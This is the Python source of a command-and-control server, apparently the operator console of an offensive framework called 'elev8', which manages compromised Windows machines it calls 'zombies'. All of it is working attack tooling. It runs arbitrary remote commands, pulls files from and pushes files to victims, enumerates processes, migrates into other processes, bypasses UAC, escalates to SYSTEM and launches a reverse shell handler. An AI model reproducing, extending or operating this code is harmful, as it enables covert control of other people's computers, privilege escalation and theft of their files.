import socket
import subprocess
import sys
import time
from tqdm import tqdm
import threading
import asyncio
from pathlib import Path
import io
import os
import psutil
#from win32com.shell import shell

#import readline
import colorama
from colorama import Fore, Back, Style
exit_event = threading.Event()

counter=-1
clientlist=[]
clientdata=[]
automigrate=""

def startrevshellsvr():
    if os.name == 'nt':
        subprocess.call(["py", "pyrevshell_server.py"])
        exit_event.set()
    else:
        subprocess.call(["python3", "pyrevshell_server.py"])
        exit_event.set()
#def startrevshellcli():
#    subprocess.call(["python", "pyrevshell_client.py"])
#    exit_event.set()
   

def probe():
    while True:
        global counter
        global clientlist
        global clientdata
       
        ############################################################
        # are any not alive anymore?  do a keep-alive probe to see...
        ############################################################
        try:
            d = 0
            for c in range(len(clientlist)):
                clientlist[c][1].send(b"?keepalive?\n")
                d = d + 1
        except:
            print(Fore.YELLOW + "\nThis Zombie died:\n************************\n" + Fore.WHITE, counter, "--> ", clientdata[d], "\n************************\n")
            clientlist.pop(d)
            clientdata.pop(d)
            counter = counter - 1
            print(Fore.GREEN + "[+] removed \"dead\" zombie ;) " + Fore.WHITE)
        time.sleep(4)

def zombies():
    global counter
    global clientlist
    global clientdata
    selection=""
    
    if (len(clientlist)) <= 0:
        print(Fore.RED + "[!] no zombies yet..." + Fore.WHITE)
        return
        
    print(Fore.GREEN + "Zombies: ", len(clientlist), Fore.WHITE)

    temp=0
    for b in clientdata:
        print("Zombie: ", temp, "-->", b)
        temp+=1
    print(Fore.GREEN + "\nPick a zombie to interact with!\n" + Fore.WHITE)
    try:
        selection=int(input(' <enter the client #> $ '))
    except:
        print(Fore.RED + "[!] enter client number..." + Fore.WHITE)
        time.sleep(2)
        return 
    
    while True:
        """
        --> you can uncomment if you want, but I like the commands showing on screen
        if os.name == 'nt':
            os.system("cls")
        else:
            os.system("clear")
        """
        try:
            choice=input(Fore.YELLOW + "[C2-Shell]:~$ " + Fore.WHITE)
        except:    
            print(Fore.RED + "[!] enter a number..." + Fore.WHITE)
            time.sleep(2)
            return
        if choice == "cls" or choice == "clear":
            if os.name == 'nt':
                os.system("cls")
            else:
                os.system("clear")
        if choice == "help" or choice == "?":
            print(Fore.GREEN)
            print("Commands\n==================")
            print("msg: Send a Message")
            print("userinfo: Get user info")
            print("execute: Enter a command to be executed!")
            print("kill: Kill Zombie")
            print("procs: list all processes & their respective users (run as admin for best results)")
            print("shell: Start a Shell!")
            print("whoami: Whoami")
            print("getsystem: gets system privs! (must be elevated)")
            print("bypassuac: bypasses UAC + creates elevated implant")
            print("migrate: migrate into another process")
            print("send: Send a file")
            print("recv: Receive a file")
            print("return: Main menu")
            print(Fore.WHITE)
            input()            
        if choice == "msg":
            try:
                clientlist[selection][1].send(b":msg:\nhey from the server!\n")
                print(Fore.GREEN + "[+] Message Sent!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] there was an error sending the msg to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "recv":
            print("Enter the filepath + filename you want to download, ex: c:\\temp\\file.txt")
            file_path=input(":").strip()
            if not "." in file_path:
                print("did you intentionally include a file without a file extension? I'm going to assume not and back out")
                print("If this was intended, well...edit this code :D")
                return
            filename = file_path.rsplit("\\", 1)[-1] 
            print(filename)
            clientlist[selection][1].send(f"~download~{file_path}~\n".encode())
            filesize=clientlist[selection][1].recv(1024)
            filesize=int(filesize.decode())
            user = os.environ.get("USER")
            download_location = f"/home/{user}/Downloads/{filename}"
            with open(download_location, 'wb') as f:
                received = 0
                while received < filesize:
                    data = clientlist[selection][1].recv(4096)
                    if not data:
                        break
                    if not "?keepalive?" in data.decode("UTF-8", errors="ignore"):
                        f.write(data)
                        received += len(data)
            print("[+] File successfully downloaded!\n")
        if choice == "send":
            file_path = input("Enter the path of the file to upload: ").strip()
            if not os.path.isfile(file_path):
                print(f"Error: File '{file_path}' does not exist.")
                return
            filename = os.path.basename(file_path)
            print(filename)
            filesize = os.path.getsize(file_path)
            print(filesize)
            clientlist[selection][1].send(f":upload:{filename}:{filesize}:\n".encode())
            #print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)
            cresponse=clientlist[selection][1].recv(1024)
            print(cresponse.decode('UTF-8'))
            time.sleep(3)
            
            with open(file_path, 'rb') as f, tqdm(total=filesize, unit="B", unit_scale=True, desc=f"Uploading {filename}") as pbar:
                for chunk in iter(lambda: f.read(4096), b''):
                    clientlist[selection][1].sendall(chunk)
                    pbar.update(len(chunk))
            
            cresponse2=clientlist[selection][1].recv(1024)
            print(cresponse2.decode('UTF-8'))
            time.sleep(3)
        if choice == "userinfo":
            for a in clientdata[selection]:
                print(a)
            input()
        if choice == "migrate":
            try:
                print("What's the process ID of the target process you'd like to migrate into?")
                print("(If in a non-admin shell, just enter any number to proceed)")
                procID = input(":")
                print("procID: ", procID)
                msg1 = f":migrate:{procID}\n" 
                clientlist[selection][1].send(msg1.encode('utf-8'))
                #print(Fore.GREEN + "[+] Initiating migration process now!" + Fore.WHITE)
                migrationstatus=clientlist[selection][1].recv(1024)
                migrationstatus = migrationstatus.decode('UTF-8')
                print(migrationstatus)
                if "newly" in migrationstatus:
                    return
                migrationstatus=clientlist[selection][1].recv(1024)
                migrationstatus = migrationstatus.decode('UTF-8')
                print(migrationstatus)
                time.sleep(4)
            except:
                print(Fore.RED + "[!] there was an error sending the msg to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "bypassuac":
            print("checking to see if this user is a member of the admins group...")
            if "True" in clientdata[selection][2]:
                print("Nice! You're in the administrators group.  continuing...")
            else:
                print("Sorry, you're either already SYSTEM or you need to be a member of the administrators groups for this to work")
                time.sleep(4)
                return
            #attackerip=input(Fore.YELLOW + "[What is the IP of your attacker box (likely this box you're using right now)]: $ " + Fore.WHITE)
            #attackerport=input(Fore.YELLOW + "[What is the port of your attacker box (likely this box you're using right now)]: $ " + Fore.WHITE)
            print("Attempting to elevate privileges from medium to high integrity with current user...")
            try:
                clientlist[selection][1].send(b":bypassuac:\n")
                print(Fore.GREEN + "[+] command successfully sent!" + Fore.WHITE)
                uacstatus=clientlist[selection][1].recv(1024)
                uacstatus = uacstatus.decode('UTF-8')
                print(uacstatus)
                time.sleep(4)
            except:
                print(Fore.RED + "[!] There was an issue communicating with the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "getsystem":
            print("[+] Please wait ~15-20 seconds and you'll receive another connection with your new [SYSTEM] shell!")
            print("We're using elevationstation's Trusted Installer technique to get all privileges for the shell btw ;) ")
            clientlist[selection][1].send(b":getsystem:\n")
            systemstatus=clientlist[selection][1].recv(1024)
            systemstatus = systemstatus.decode('UTF-8')
            print(systemstatus)
            time.sleep(4)
            #getsystem=clientlist[selection][1].recv(1024)
            #getsystem = whoami.decode('UTF-8')
            #print("Results: ", getsystem)
            #time.sleep(2)
        if choice == "procs":
            print("Give this about 10-15 seconds to execute.  Lots of data to load...\n")
            try:
                thecommand="for /f \"tokens=1,2,7,8,9\" %A in ('tasklist /NH /V') do @echo %A %B %C %D %E"
                clientlist[selection][1].send(f"c0mm@nd\ncmd.exe /c {thecommand}\n".encode('utf-8'))
                print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)
                #clientlist[selection][1].settimeout(4)
                while True:
                    data2=clientlist[selection][1].recv(1024)
                  
                    if not data2 or ":endofoutput:" in data2.decode():
                        endoutput=data2.decode()
                        endoutput = endoutput.replace(":endofoutput:", "")
                        print(endoutput, end='')
                        break
                    #proclist = proclist.decode('UTF-8')
                    #print(proclist)
                    print(data2.decode(), end='')
                input("[+] DONE! Press any key to return...")
            except:
                print(Fore.RED + "[+] Either reached end of output for receiving socket or..." + Fore.WHITE)
                print(Fore.RED + "[!] there was an error sending the command to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "execute":
            try:
                print("Enter your command you would like to execute on the agent below")
                thecommand=input(":")
                clientlist[selection][1].send(f"c0mm@nd\ncmd.exe /c {thecommand}\n".encode('utf-8'))
                print(Fore.GREEN + "[+] command sent!" + Fore.WHITE)
                #clientlist[selection][1].settimeout(4)
                while True:
                    data2=clientlist[selection][1].recv(1024)
                  
                    if not data2 or ":endofoutput:" in data2.decode():
                        endoutput=data2.decode()
                        endoutput = endoutput.replace(":endofoutput:", "")
                        print(endoutput, end='')
                        break
                    #proclist = proclist.decode('UTF-8')
                    #print(proclist)
                    print(data2.decode(), end='')
                input("[+] DONE! Press any key to return...")
            except:
                print(Fore.RED + "[+] Either reached end of output for receiving socket or..." + Fore.WHITE)
                print(Fore.RED + "[!] there was an error sending the command to the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "kill":
            try:
                clientlist[selection][1].send(b"self-destruct\n")
                print(Fore.GREEN + "[+] zombie self-destruct succeeded!" + Fore.WHITE)
                time.sleep(2)
            except:
                print(Fore.RED + "[!] There was an issue communicating with the zombie...\ncheck to see if your zombie died" + Fore.WHITE)
                time.sleep(2)
        if choice == "shell":
            #starttheshell(clientlist[selection][1])
            #subprocess.call(["python", "testsocketserver.py"])
            exit_event.clear()
            
            handler_thread = threading.Thread(target=startrevshellsvr)
            handler_thread.daemon = True
            handler_thread.start()
            
            print("[+] starting shell in 2 seconds!")
            time.sleep(2)
            
            clientlist[selection][1].send(b":shell:\n")
            
            #handler_thread2 = threading.Thread(target=startrevshellcli)
            #handler_thread2.daemon = True
            #handler_thread2.start()
            while not exit_event.is_set():
                time.sleep(1)
            return
        if choice == "whoami":
            clientlist[selection][1].send(b":whoami:\n")
            whoami=clientlist[selection][1].recv(1024)
            whoami = whoami.decode('UTF-8')
            print("You are: ", whoami)
            time.sleep(2)

        if choice == "return":
            return
   
def server_selection():
    global clientlist
    commands="True"
    
    
    while not "exit" in commands:
        
        command=input(Fore.CYAN + "<< elev8 >> $ " + Fore.WHITE)
        if command=="":
            pass
        if command=="zombies":
            zombies()
        if command == "cls" or command == "clear":
            if os.name == 'nt':
                os.system("cls")
            else:
                os.system("clear")
        if command == "?" or command == "help":
            print(Fore.YELLOW + "commands:\n$ zombies\n$ clear/cls (clears screen)\n$ control + C kills server\n" + Fore.WHITE)
        

def init_main_sock():
    while True:
        conn, addr = s.accept()
        print(Fore.GREEN, f'\n[*] Accepted new connection from: {addr[0]}:{addr[1]} !!!', Fore.WHITE)
        # Get the client socket handle
        client_sock_handle = conn.fileno()
        print(f"Client socket handle: {client_sock_handle}")
       #for elevateproc in psutil.process_iter():
           #if "elevationstation" in elevateproc.name():
               #elevateproc.kill()
        global counter
        global automigrate
        counter+=1
        #print("gathering client info...")
        clientinfo = conn.recv(1024)
        clientinfo = clientinfo.decode('UTF-8')
        clientinfo=clientinfo.split("\n")
        UserInfo=clientinfo[0]
        #print(clientinfo)
        clientlist.append([counter, conn, UserInfo])
        clientdata.append(clientinfo)
        
        handler_thread = threading.Thread(target=probe)
        handler_thread.daemon = True
        handler_thread.start()
        
host = "0.0.0.0"
port = 4545

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((host, port))
s.listen(5)
print(Fore.YELLOW + "[+] listening on port "+str(port), Fore.WHITE)

handler_thread = threading.Thread(target=init_main_sock)
handler_thread.daemon = True
handler_thread.start()

handler_thread = threading.Thread(target=server_selection)
handler_thread.daemon = True
handler_thread.start()

while True:
    time.sleep(1)
